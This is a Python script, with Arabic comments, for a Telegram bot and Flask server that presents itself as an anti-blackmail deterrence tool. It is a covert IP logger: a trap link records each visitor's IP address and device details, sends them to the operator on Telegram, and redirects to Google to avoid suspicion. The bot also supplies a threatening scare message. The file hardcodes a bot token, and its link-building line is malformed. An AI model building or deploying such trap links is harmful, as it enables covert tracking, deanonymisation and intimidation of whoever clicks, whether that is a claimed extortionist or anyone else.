import telebot
from flask import Flask, request, redirect
import threading
import os

# --- إعدادات النظام ---
TOKEN = '8126709241:AAFxizwyusZ6xDEWzC15s3Y0lyqpC3vUDoI'
ADMIN_ID = "6102641066"  # هويتك الرقمية التي تظهر في التقارير
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- 1. نظام سحب البيانات (Tracker) ---
@app.route('/check')
def tracker():
    # سحب الـ IP الحقيقي حتى لو كان خلف بروكسي
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    # تحديد نوع الجهاز ببساطة
    device = "غير معروف"
    if "Android" in user_agent: device = "Android 📱"
    elif "iPhone" in user_agent: device = "iPhone 🍏"
    elif "Windows" in user_agent: device = "Windows PC 💻"

    # إرسال التقرير فوراً للمتمرد اليماني
    report = "⚠️ **تم رصد دخول للمستهدف!**\n\n"
    report += f"🌐 **عنوان الـ IP:** `{ip}`\n"
    report += f"📱 **نوع الجهاز:** {device}\n"
    report += f"🛠️ **المتصفح:** `{user_agent[:50]}...`\n\n"
    report += "💡 *نصيحة:* استخدم الـ IP الآن لإرعاب المبتز."
    
    try:
        bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
    except Exception as e:
        print(f"Error sending message: {e}")
        
    # توجيه المبتز لموقع وهمي (جوجل) لعدم الشك
    return redirect("https://www.google.com")

# --- 2. أوامر بوت تليجرام ---
@bot.message_handler(commands=['start'])
def welcome(message):
    welcome_text = (
        "🛡️ **أهلاً بك في نظام الردع التقني**\n\n"
        "هذا البوت مخصص لمكافحة المبتزين وحماية الضحايا.\n"
        "• استخدم /link للحصول على رابط الفخ.\n"
        "• استخدم /scare للحصول على نص التهديد."
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['link'])
def send_link(message):
    # سيتم استبدال هذا الرابط لاحقاً برابط Railway الخاص بك
    domain = "https://github.com/gcgguu25584-ai/main.py/blob/a05faf7b6c664612e449cd1fdcef9604a0b9f97b/main.py#L55" 
    msg = "🛡️ **رابط الفخ جاهز:**\n"
    msg += f"`https://{domain}/check`\n\n"
    msg += "أرسله للمبتز، وبمجرد دخوله ستصلك بياناته هنا."
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(commands=['scare'])
def scare_msg(message):
    scare_text = (
        "⚠️ **تحذير أمني نهائي**\n"
        "تم رصد نشاطك السيبراني وسحب هويتك الرقمية (IP & Device ID).\n"
        "تم تحديد موقعك التقريبي وتوثيق محاولة الابتزاز.\n"
        "لديك 10 دقائق لحذف كافة المحتويات وإغلاق الحساب قبل إرسال البيانات لوحدة مكافحة الجرائم الإلكترونية."
    )
    bot.reply_to(message, scare_text)

# --- 3. تشغيل النظامين معاً ---
def run_bot():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    # تشغيل البوت في الخلفية
    threading.Thread(target=run_bot).start()
    # تشغيل الموقع البرمجي
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
